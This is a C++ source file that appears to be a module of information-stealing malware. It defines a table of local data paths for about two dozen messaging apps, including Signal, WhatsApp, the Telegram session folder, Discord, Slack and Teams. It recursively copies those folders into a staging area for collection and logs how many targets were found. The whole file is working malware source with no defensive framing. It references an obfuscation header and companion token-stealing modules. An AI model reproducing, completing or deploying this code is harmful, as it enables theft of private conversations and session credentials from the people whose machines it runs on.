// Messengers: Skype, Signal, Tox, Pidgin, Element, ICQ, WhatsApp, Viber, Telegram (json).
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <sstream>

namespace {

struct MsgTarget { const char* name; const char* path; const char* pattern; };

const MsgTarget k_messengers[] = {
    {"Skype", "%APPDATA%\\Microsoft\\Skype for Desktop", "*"},
    {"Skype classic", "%APPDATA%\\Skype", "*"},
    {"Signal", "%APPDATA%\\Signal", "*"},
    {"Signal local", "%LOCALAPPDATA%\\Signal", "*"},
    {"Tox", "%APPDATA%\\Tox", "*"},
    {"qTox", "%APPDATA%\\tox", "*"},
    {"Pidgin", "%APPDATA%\\.purple", "*"},
    {"Element", "%APPDATA%\\Element\\Local Storage", "*"},
    {"Element config", "%APPDATA%\\Element", "config.json"},
    {"ICQ", "%APPDATA%\\ICQ", "*"},
    {"ICQ local", "%LOCALAPPDATA%\\ICQ", "*"},
    {"WhatsApp", "%APPDATA%\\WhatsApp\\Local Storage", "*"},
    {"WhatsApp packages", "%LOCALAPPDATA%\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState", "*"},
    {"Viber", "%APPDATA%\\Viber", "*"},
    {"Viber local", "%LOCALAPPDATA%\\Viber", "*"},
    {"Telegram session json", "%APPDATA%\\Telegram Desktop\\user_data", "*"},
    {"Discord (see tokens module)", "%APPDATA%\\discord", "Local State"},
    {"Zalo", "%APPDATA%\\ZaloData", "*"},
    {"Line", "%LOCALAPPDATA%\\LINE", "*"},
    {"Slack (see socials)", "%APPDATA%\\Slack", "Local State"},
    {"Teams (see socials)", "%APPDATA%\\Microsoft\\Teams", "Local State"},
    {"Messenger", "%APPDATA%\\Facebook\\Messenger", "*"},
    {"Mumble", "%APPDATA%\\Mumble", "*"},
    {"TeamSpeak", "%APPDATA%\\TS3Client", "*"},
    {"TeamSpeak identities", "%APPDATA%\\TeamSpeak", "*"},
    {"Jabber", "%APPDATA%\\.jabber", "*"},
};

} // namespace

namespace mod {

void messengers(const std::string& staging) {
    std::ostringstream summary;
    int hits = 0;
    for (auto& m : k_messengers) {
        std::string path = util::expand_env(m.path);
        if (path.empty() || !util::path_exists(path)) continue;
        hits++;
        if (util::is_dir(path)) {
            util::copy_dir_recursive(path, util::join(staging, "messengers\\" + std::string(m.name)),
                                     {m.pattern}, 32 * 1024 * 1024);
        } else {
            std::vector<uint8_t> data;
            if (util::read_file(path, data) && data.size() < cfg::MAX_GRAB_FILE)
                stage::stage_bytes("messengers", "ls_" + util::replace_all(std::string(m.name), " ", "_"), data);
        }
        summary << "  " << m.name << ": " << path << "\r\n";
    }
    stage::stage_text("messengers", "_summary.txt", summary.str());
    stage::note("messengers", std::to_string(hits) + " targets collected");
}

} // namespace mod
